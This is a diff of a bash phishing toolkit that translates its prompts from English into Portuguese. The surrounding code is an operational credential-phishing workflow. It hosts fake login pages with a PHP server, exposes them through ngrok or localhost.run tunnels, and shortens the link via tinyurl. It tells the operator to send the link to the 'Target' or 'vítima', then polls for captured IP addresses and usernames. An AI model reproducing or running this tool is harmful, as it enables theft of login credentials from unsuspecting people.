@@ -783,10 +783,10 @@ catch_cred() {
 }
 
 getcredentials() {
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] CREDENCIAIS DE ESPERA...\e[0m\n"
     while [ true ]; do
     if [[ -e ".sites/$server/usernames.txt" ]]; then
-        printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
+        printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m CREDENCIAIS ENCONTRADA!\n"
         catch_cred
     fi
         sleep 1
@@ -863,7 +863,7 @@ start1() {
         printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Localhost Run\e[0m\n"
         printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
         default_option_server="1"
-        read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
+        read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha uma opção de encaminhamento de porta: \e[0m\en' option_server
         option_server="${option_server:-${default_option_server}}"
         if [[ $option_server == 1 || $option_server == 01 ]]; then
             start
@@ -881,22 +881,22 @@ start1() {
 start_l() {
 def_port="5555"
 printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m  \e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
 read port
 port="${port:-${def_port}}"
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Inicializando...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
 cd webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Hospedado com sucesso em:\e[0m\e[1;93m http://localhost:$port\e[0m\n"
 printf "\n"
 checkfound
 }
 start_local(){
 def_port="5555"
 printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Selecione uma porta (padrão:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
 read port
 port="${port:-${def_port}}"
 printf "\e[0m\n"
@@ -904,17 +904,17 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m
 cd webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
 sleep 2
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Iniciando LocalHostRun ..\e[0m\n"
 printf "\n"
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Ctrl + C to view Login Info.Press it After the Victim Opened It.\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Ctrl + C para ver as informações de login. Pressione-o após a vítima abri-lo.\e[0m\n"
 printf "\e[1;93m\n"
 ssh -R 80:localhost:$port ssh.localhost.run 2>&1
 printf "\e[0m\n"
 printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Login Info..\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Informações de login..\e[0m\n"
 while [ true ]; do
 if [[ -e "webpages/$server/ip.txt" ]]; then
 c_ip
@@ -947,7 +947,7 @@ startx() {
             rm -rf webpages/$server/usernames.txt
         fi
             default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
-            printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
+            printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha uma porta (padrão:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
             read port
             port="${port:-${default_port}}"
             serverx
@@ -963,20 +963,20 @@ start() {
         if [[ -e webpages/$server/usernames.txt ]]; then
             rm -rf webpages/$server/usernames.txt
         fi
-            printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+            printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor php...\n"
             cd webpages/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
             sleep 2
-            printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
+            printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor ngrok...\n"
             ./ngrok http 3333 > /dev/null 2>&1 &
             sleep 4
             
 # Don't mess with the regex, bitchy boring thing to do
 
             link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-            printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
+            printf "\e[1;92m[\e[0m*\e[1;92m] Envie este link para o Target:\e[0m\e[1;77m %s\e[0m\n" $link
             send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=$link" | head -n1)
 # send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-            printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+            printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Ou usando tinyurl:\e[0m\e[1;77m %s \n' $send_ip
             printf "\n"
             checkfound
 }
@@ -984,21 +984,21 @@ start() {
 
 checkfound() {
     printf "\n"
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ctrl + c to exit...\e[0m\n"
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Aguardando vítima abra o link ctrl + c para sair...\e[0m\n"
     while [ true ]; do
         if [[ -e "webpages/$server/ip.txt" ]]; then
-            printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
+            printf "\n\e[1;92m[\e[0m*\e[1;92m] IP ENCONTRADO!\n"
             catch_ip
             rm -rf webpages/$server/ip.txt
         fi
             sleep 0.5
             if [[ -e "webpages/$server/usernames.txt" ]]; then
-                printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
+                printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credenciais encontradas!\n"
                 catch_cred
                 rm -rf webpages/$server/usernames.txt
                 fi
                 if [[ -e "webpages/$server/saved.ip.txt" ]]; then
-                    printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
+                    printf "\n\e[1;92m[\e[0m*\e[1;92m] IP ENCONTRADO!\n"
                     catch_ip
                     rm -rf webpages/$server/saved.ip.txt
                 fi
